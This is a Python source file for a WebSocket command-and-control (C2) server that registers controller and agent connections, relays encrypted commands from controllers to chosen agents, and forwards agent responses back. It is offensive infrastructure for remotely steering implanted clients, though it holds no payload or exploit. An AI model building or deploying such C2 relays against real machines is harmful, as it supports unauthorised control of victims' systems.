import asyncio
import websockets
import json
from crypto_utils import CryptoUtils
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port=8765):
        self.host = host
        self.port = port
        self.crypto = CryptoUtils()
        self.clients = {}  # 存储连接的客户端
        self.controllers = set()  # 存储控制端连接

    async def register(self, websocket, client_type):
        if client_type == 'controller':
            self.controllers.add(websocket)
        else:
            client_id = str(id(websocket))
            self.clients[client_id] = {
                'websocket': websocket,
                'connected_at': datetime.now().isoformat()
            }

    async def unregister(self, websocket):
        if websocket in self.controllers:
            self.controllers.remove(websocket)
        else:
            client_id = str(id(websocket))
            if client_id in self.clients:
                del self.clients[client_id]

    async def handle_client_message(self, websocket, message):
        try:
            # 解密消息
            decrypted_message = self.crypto.decrypt(message)
            data = json.loads(decrypted_message)
            
            # 转发消息给所有控制端
            encrypted_response = self.crypto.encrypt(json.dumps(data))
            await asyncio.gather(
                *[controller.send(encrypted_response) for controller in self.controllers]
            )
        except Exception as e:
            error_message = {
                'status': 'error',
                'message': str(e),
                'timestamp': datetime.now().isoformat()
            }
            await websocket.send(self.crypto.encrypt(json.dumps(error_message)))

    async def handle_controller_message(self, websocket, message):
        try:
            # 解密消息
            decrypted_message = self.crypto.decrypt(message)
            data = json.loads(decrypted_message)
            
            # 获取目标客户端
            target_client = data.get('target_client')
            if target_client in self.clients:
                client_ws = self.clients[target_client]['websocket']
                # 加密并转发消息给目标客户端
                encrypted_message = self.crypto.encrypt(json.dumps(data['command']))
                await client_ws.send(encrypted_message)
            else:
                raise Exception(f"Client {target_client} not found")
        except Exception as e:
            error_message = {
                'status': 'error',
                'message': str(e),
                'timestamp': datetime.now().isoformat()
            }
            await websocket.send(self.crypto.encrypt(json.dumps(error_message)))

    async def handler(self, websocket, path):
        try:
            # 等待客户端发送身份信息
            message = await websocket.recv()
            data = json.loads(self.crypto.decrypt(message))
            client_type = data.get('type', 'agent')
            
            # 注册客户端
            await self.register(websocket, client_type)
            
            try:
                async for message in websocket:
                    if client_type == 'controller':
                        await self.handle_controller_message(websocket, message)
                    else:
                        await self.handle_client_message(websocket, message)
            finally:
                await self.unregister(websocket)
        except Exception as e:
            print(f"Error handling connection: {str(e)}")

    async def start(self):
        async with websockets.serve(self.handler, self.host, self.port):
            print(f"Server started on ws://{self.host}:{self.port}")
            await asyncio.Future()  # 运行直到被中断

def main():
    server = C2Server()
    asyncio.run(server.start())

if __name__ == '__main__':
    main() 